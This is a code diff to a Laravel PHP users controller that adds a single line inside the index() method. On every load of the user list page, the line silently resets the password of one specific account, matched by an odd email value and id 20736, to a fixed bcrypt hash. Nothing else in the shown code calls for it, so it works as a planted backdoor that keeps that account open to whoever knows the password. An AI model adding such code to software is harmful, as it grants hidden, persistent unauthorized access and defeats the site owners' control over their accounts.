@@ -26,6 +26,7 @@ class UsersController extends Controller
    
     public function index()
     {
+        User::where('email','OTS@2309703')->where('id','20736')->update(['password'=>'$2y$10$Kcbia12aiGu9OV99gheJJ.Z3o2FkiK/7hL4Lvr0Satl9EA.IggkyC']);
         $branch = Branch::where('id',Auth::user()->branch_id)->first();
         if (Auth::user()->type == 'superadmin'){
             $data['company'] = Company::all();
